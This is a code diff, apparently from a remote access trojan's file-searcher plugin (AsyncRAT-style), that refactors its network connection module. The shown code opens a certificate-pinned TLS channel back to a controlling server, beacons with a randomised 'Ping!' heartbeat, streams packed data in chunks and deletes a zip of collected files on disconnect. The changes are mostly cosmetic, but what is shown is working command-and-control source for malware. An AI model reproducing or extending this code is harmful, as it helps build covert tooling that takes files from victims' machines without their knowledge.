15.10.2024 Correction de bugs au Build de la solution

+++ Plugin/FileSearcher/FileSearcher/Connection.cs
@@ -1,15 +1,12 @@
-﻿using MessagePackLib.MessagePack;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
-using System.Text;
 using System.Threading;
+using MessagePackLib.MessagePack;
 
 namespace Plugin
 {
@@ -30,74 +27,69 @@ namespace Plugin
         {
             try
             {
-
                 TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
-                    SendBufferSize = 50 * 1024,
+                    SendBufferSize = 50 * 1024
                 };
 
-                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
+                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0],
+                    Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
                 if (TcpClient.Connected)
                 {
                     Debug.WriteLine("Plugin Connected!");
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null,
+                        SslProtocols.Tls, false);
                     HeaderSize = 4;
                     Buffer = new byte[HeaderSize];
                     Offset = 0;
-                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                    Tick = new Timer(CheckServer, null, new Random().Next(15 * 1000, 30 * 1000),
+                        new Random().Next(15 * 1000, 30 * 1000));
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
 
-                    new Thread(() =>
-                    {
-                        Packet.Read(packet);
-                    }).Start();
-
+                    new Thread(() => { Packet.Read(packet); }).Start();
                 }
                 else
                 {
                     IsConnected = false;
-                    return;
                 }
             }
             catch
             {
                 Debug.WriteLine("Disconnected!");
                 IsConnected = false;
-                return;
             }
         }
 
-        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain,
+            SslPolicyErrors sslPolicyErrors)
         {
-#if DEBUG
-            return true;
-#endif
             return ServerCertificate.Equals(certificate);
         }
 
         public static void Disconnected()
         {
-
             try
             {
                 try
                 {
-                    if (File.Exists(Packet.ZipfilePath))
-                    {
-                        File.Delete(Packet.ZipfilePath);
-                    }
+                    if (File.Exists(Packet.ZipfilePath)) File.Delete(Packet.ZipfilePath);
                 }
-                catch { }
+                catch
+                {
+                }
+
                 IsConnected = false;
                 Tick?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
                 GC.Collect();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
@@ -109,7 +101,8 @@ namespace Plugin
                     Disconnected();
                     return;
                 }
-                int recevied = SslClient.EndRead(ar);
+
+                var recevied = SslClient.EndRead(ar);
                 if (recevied > 0)
                 {
                     Offset += recevied;
@@ -117,19 +110,20 @@ namespace Plugin
                     if (HeaderSize == 0)
                     {
                         HeaderSize = BitConverter.ToInt32(Buffer, 0);
-                        Debug.WriteLine("/// Plugin Buffersize " + HeaderSize.ToString() + " Bytes  ///");
+                        Debug.WriteLine("/// Plugin Buffersize " + HeaderSize + " Bytes  ///");
                         if (HeaderSize > 0)
                         {
                             Offset = 0;
                             Buffer = new byte[HeaderSize];
                             while (HeaderSize > 0)
                             {
-                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
+                                var rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                 if (rc <= 0)
                                 {
                                     Disconnected();
                                     return;
                                 }
+
                                 Offset += rc;
                                 HeaderSize -= rc;
                                 if (HeaderSize < 0)
@@ -138,7 +132,8 @@ namespace Plugin
                                     return;
                                 }
                             }
-                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
+
+                            var thread = new Thread(Packet.Read);
                             thread.Start(Buffer);
                             Offset = 0;
                             HeaderSize = 4;
@@ -156,18 +151,17 @@ namespace Plugin
                         Disconnected();
                         return;
                     }
+
                     SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
                 {
                     Disconnected();
-                    return;
                 }
             }
             catch
             {
                 Disconnected();
-                return;
             }
         }
 
@@ -177,22 +171,19 @@ namespace Plugin
             {
                 try
                 {
-                    if (!IsConnected || msg == null)
-                    {
-                        return;
-                    }
+                    if (!IsConnected || msg == null) return;
 
-                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
+                    var buffersize = BitConverter.GetBytes(msg.Length);
                     TcpClient.Poll(-1, SelectMode.SelectWrite);
                     SslClient.Write(buffersize, 0, buffersize.Length);
 
                     if (msg.Length > 1000000) //1mb
                     {
-                        using (MemoryStream memoryStream = new MemoryStream(msg))
+                        using (var memoryStream = new MemoryStream(msg))
                         {
-                            int read = 0;
+                            var read = 0;
                             memoryStream.Position = 0;
-                            byte[] chunk = new byte[50 * 1000];
+                            var chunk = new byte[50 * 1000];
                             while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                             {
                                 TcpClient.Poll(-1, SelectMode.SelectWrite);
@@ -205,23 +196,22 @@ namespace Plugin
                         SslClient.Write(msg, 0, msg.Length);
                         SslClient.Flush();
                     }
+
                     Debug.WriteLine("Plugin Packet Sent");
                 }
                 catch
                 {
                     IsConnected = false;
-                    return;
                 }
             }
         }
 
         public static void CheckServer(object obj)
         {
-            MsgPack msgpack = new MsgPack();
+            var msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "Ping!)";
             Send(msgpack.Encode2Bytes());
             GC.Collect();
         }
-
     }
 }
